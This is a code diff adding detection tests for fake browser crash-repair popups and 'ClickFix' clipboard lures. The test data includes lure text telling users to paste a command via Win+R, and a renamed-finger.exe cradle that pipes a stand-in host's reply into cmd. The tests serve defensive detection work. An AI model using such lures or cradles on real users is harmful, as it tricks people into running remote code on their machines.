@@ -1200,6 +1200,39 @@ def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
     assert "fake_browser_update" not in _hits(_cap("https://browser-update.org/", [ok]))
 
 
+_CRASH_TEXT = ("Your browser stopped abnormally. Security issues detected. "
+               "Press Win + R, then Ctrl + V and Enter to repair your browser.")  # noqa: E501
+
+
+def test_crashfix_repair_lure_fires_and_vendor_crash_page_is_quiet():
+    """DE-CFX-010: fake crash-repair popup plus a clipboard command."""
+    page = _page("https://adblock-help.example/", title="Chrome", text=_CRASH_TEXT)
+    data = _clipcap("https://adblock-help.example/", "cmd /c start calc", [page])
+    assert "crashfix_repair_lure" in _hits(data)
+    # A vendor's genuine help page about crashes, no clipboard command.
+    help_page = _page("https://support.google.com/chrome/answer/1", title="Fix Chrome crashes",
+                      text="If Chrome has crashed or stopped abnormally, restart it.")  # noqa: E501
+    assert "crashfix_repair_lure" not in _hits(_cap("https://support.google.com/chrome/answer/1", [help_page]))  # noqa: E501
+    # Crash wording on a third-party blog with no command or paste instruction.
+    blog = _page("https://tech-news.example/", title="Why your browser crashed",
+                 text="Browser crashed? Security issues detected in old versions.")  # noqa: E501
+    assert "crashfix_repair_lure" not in _hits(_cap("https://tech-news.example/", [blog]))
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # finger.exe copied under another name to dodge rules keyed on "finger".
+        "cmd /c copy C:\\Windows\\System32\\finger.exe %TEMP%\\ct.exe",
+        "ct.exe probe@x.example | cmd",
+    ],
+)
+def test_renamed_finger_cradle_is_unambiguous_clickfix(text):
+    data = _data("https://x.example/", clipboard=_clip(text))
+    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
+    assert "clickfix_clipboard_command" in _hits(data)
+
+
 def test_smuggled_credential_page_fires_and_https_page_is_quiet():
     blob = _page("blob:https://host.example/uuid", forms=[PASSWORD_FORM])
     assert "smuggled_credential_page" in _hits(_cap("https://host.example/", [blob]))
